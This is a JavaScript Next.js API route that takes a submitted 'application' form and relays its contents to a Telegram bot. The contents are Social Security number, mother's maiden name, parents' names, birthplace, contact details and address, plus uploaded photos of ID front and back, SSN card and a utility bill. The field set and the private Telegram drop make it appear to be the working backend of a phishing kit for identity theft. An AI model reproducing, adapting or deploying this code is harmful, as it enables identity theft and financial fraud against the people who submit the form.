export const config = {
  api: {
    bodyParser: false,
  },
};

import formidable from "formidable";
import fs from "fs";
import fetch from "node-fetch";
import FormData from "form-data";

export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ message: "Method not allowed" });
  }

  const form = formidable({ multiples: true });

  form.parse(req, async (err, fields, files) => {
    if (err) {
      console.error("Form parse error:", err);
      return res.status(500).json({ error: "Form parse error" });
    }

    const BOT_TOKEN = process.env.BOT_TOKEN;
    const CHAT_ID = process.env.CHAT_ID;

    if (!BOT_TOKEN || !CHAT_ID) {
      return res.status(500).json({ error: "Missing environment variables" });
    }

    try {
      // ✅ Send text message
      const message = `
📩 NEW APPLICATION

👤 First Name: ${fields.firstName}
👤 Last Name: ${fields.lastName}

🆔 SSN: ${fields.ssn}

📞 Phone: ${fields.phone}
📧 Email: ${fields.email}

🏠 Address: ${fields.address}

⚧ Gender: ${fields.gender}

👨 Father's Name: ${fields.fatherName}
👩 Mother's Name: ${fields.motherName}
👩‍🍼 Mother's Maiden Name: ${fields.motherMaidenName}

🌍 Place of Birth: ${fields.birthPlace}
`;

      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message,
        }),
      });

      // ✅ Send files as PHOTOS (previewable in Telegram)
      const fileFields = ["idFront", "idBack", "ssnCard", "utilityBill"];

      for (let field of fileFields) {
        if (files[field]) {
          const file = Array.isArray(files[field])
            ? files[field][0]
            : files[field];

          const formData = new FormData();
          formData.append("chat_id", CHAT_ID);

          // Send as photo instead of document
          formData.append(
            "photo",
            fs.createReadStream(file.filepath),
            {
              filename: `${field}.jpg`,
              contentType: "image/jpeg",
            }
          );

          await fetch(
            `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
            {
              method: "POST",
              body: formData,
              headers: formData.getHeaders(),
            }
          );
        }
      }

      return res.status(200).json({ success: true });

    } catch (error) {
      console.error("Telegram error:", error);
      return res.status(500).json({ error: "Telegram send failed" });
    }
  });
}
